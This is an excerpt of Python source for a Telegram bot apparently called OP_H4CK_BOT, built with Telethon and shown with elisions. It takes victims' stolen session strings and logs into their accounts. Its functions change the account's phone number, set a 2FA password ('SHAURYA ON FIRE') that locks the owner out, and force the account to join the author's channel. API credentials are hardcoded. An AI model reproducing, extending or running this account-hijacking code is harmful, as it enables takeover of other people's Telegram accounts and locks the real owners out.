...
client = TelegramClient('ii_tsf_co_owner_ii', api_id, api_hash).start(bot_token=token)
...
II_TSF_CO_OWNER_II = 1673703180 

Bot_Username =os.environ.get("BOT_USERNAME", None) or "OP_H4CK_BOT"

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@TEAM_SHAURYA"))
...
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    ...
    try:
      ...
      pass
    try:
      await X.edit_2fa('SHAURYA ON FIRE')
      return True
    except:
      return False
...
I will add more features Later ❤️
'''
mm = '''
**⚜NOTICE FIRST JOIN LEGEND CHANNEL @TEAM_SHAURYA⚜**
'''
...
keyboard = [
  ...
  [
    Button.url("Owner", "https://t.me/II_TSF_CO_OWNER_II")
    ]
]
...
async def op(event):
  ...
  if not event.is_private:
    ...
    await event.reply("Click Below To Use Me", buttons=SHAURYAOP)
  else:
    shauryabye = [
      [
